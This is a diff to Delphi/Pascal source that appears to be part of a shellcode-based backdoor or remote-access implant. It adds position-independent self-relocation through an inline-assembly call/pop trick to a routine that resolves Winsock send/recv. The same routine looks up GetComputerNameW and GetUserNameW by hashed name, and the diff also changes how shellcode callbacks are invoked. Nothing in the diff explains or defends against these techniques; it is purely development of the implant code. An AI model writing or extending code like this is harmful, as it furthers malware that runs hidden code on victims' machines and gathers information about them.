@@ -88,7 +88,7 @@ end;
 procedure CallShellCode(pConn:PConnRec; pShell:PShellCode);
 var
   pCallShell:PShellCodeRec;
-  pCall:procedure(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);
+  pCall:procedure(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
 begin
   pCallShell := SearchShellCode(pConn, pShell.dwID);
   if pCallShell <> nil then
@@ -228,6 +228,28 @@ begin
   end;
 end;
 
+procedure LoadHelpers(pConn:PConnRec);stdcall;
+var
+  dwStaticAddress:Cardinal;
+  dwLoadHelpers:Cardinal;
+  dwEIP:Cardinal;
+  dwRelativeAddress:Cardinal;
+begin
+  asm
+    call @getEIP
+    @getEIP:
+    pop eax
+    mov dwEIP, eax
+  end;
+  dwEIP := dwEIP - 11;
+  dwLoadHelpers := DWORD(@LoadHelpers);
+
+  dwStaticAddress := DWORD(@SendBuffer);
+  dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+  pConn.xSendBuffer := Pointer(dwRelativeAddress);
+end;
+
+
 function ResolveWinsockAPI(pAPI:PAPIRec):PConnRec;
 var
   strWinsock:Array[0..11] of Char;
@@ -263,6 +285,7 @@ begin
     Result.xrecv := pAPI.xGetProcAddress(Result.hWinsock, @strrecv[0]);
     Result.xGetComputerNameW := pAPI.xGetProcAddressEx(pAPI.hKernel32, $4E5771A7, 16);
     Result.xGetUserNameW := pAPI.xGetProcAddressEx(pAPI.hAdvapi32, $ADA2AFC2, 12);
+    LoadHelpers(Result);
   end;
 end;
 
